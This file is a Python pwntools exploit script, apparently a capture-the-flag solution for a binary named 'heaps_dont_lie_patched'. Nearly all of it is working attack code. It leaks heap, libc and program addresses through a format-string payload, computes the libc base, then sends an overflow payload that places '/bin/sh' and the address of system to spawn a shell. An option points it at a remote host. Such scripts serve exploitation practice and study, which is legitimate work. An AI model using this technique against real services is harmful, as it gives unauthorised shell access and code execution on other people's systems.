#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('heaps_dont_lie_patched')
libc = exe.libc
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']

context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
breakrva 0x1380
breakrva 0x13db
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def solve():

    i = 0x1450 // 8
    print(f"trying: {hex(i * 8)}")
    io.sendline(b"%7$p.%11$p.%15$p")
    io.recvuntil(b"tune : ")
    addr = io.recvline().split(b".")

    heap_leak = int(addr[0], 16)
    libc.address = int(addr[1], 16) - 0x2a1ca
    exe.address = int(addr[2].strip(), 16) - 0x1332

    buf = heap_leak + (i * 8)
    
    info("libc base: %#x", libc.address)
    info("elf base: %#x", exe.address)
    info("heap buf: %#x", buf)

    system = libc.sym["system"]
    sh = next(libc.search(b"/bin/sh\x00"))
    og = libc.address + 0x1111aa

    sh = b"/bin/sh\x00"
    payload = sh + b"A"*(0x20 - len(sh))+ p64(system)

    io.sendline(payload)
    io.interactive()
        
       

def main():

    init()
    solve()
    

if __name__ == '__main__':
    main()
